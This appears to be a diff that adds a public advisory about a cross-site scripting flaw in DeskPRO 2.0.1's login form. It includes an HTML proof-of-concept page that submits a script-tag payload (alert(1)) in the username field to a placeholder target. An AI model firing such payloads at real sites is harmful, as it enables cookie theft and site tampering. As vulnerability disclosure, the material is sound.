@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/23381/info
+
+DeskPRO is prone to an HTML-injection scripting vulnerability because the application fails to properly sanitize user-supplied input.
+
+Attacker-supplied HTML and script code would execute in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.
+
+DeskPRO 2.0.1 is vulnerable to this issue. 
+
+<html>
+<head><title>DeskPRO v2.0.1 - Cross-Site Scripting Vulnerability</title><body>
+
+<center><br><br><font size=4>DeskPRO v2.0.1 - Cross-Site Scripting Vulnerability</font><br><font size=3>discovered by <a href="http://john-martinelli.com">John
+Martinelli</a></font><br>
+
+<br><br>
+<form action="http://target.com/login.php" method="post">
+<input type=hidden name="login_form" value="login">
+<input type=hidden name="_getvars" value="getvars">
+<input type=hidden name="_postvars" value="postvars">
+<input type=hidden name="_filevars" value="filevars">
+<input type=hidden name="password" value="password">
+<input type=hidden name="remember" value=0>
+<input name="username" size=75 value="<"<<script>alert(1);</script>">
+<input type=submit value="Execute XSS Attack" class="button">
+</form>
+
+</body></html>
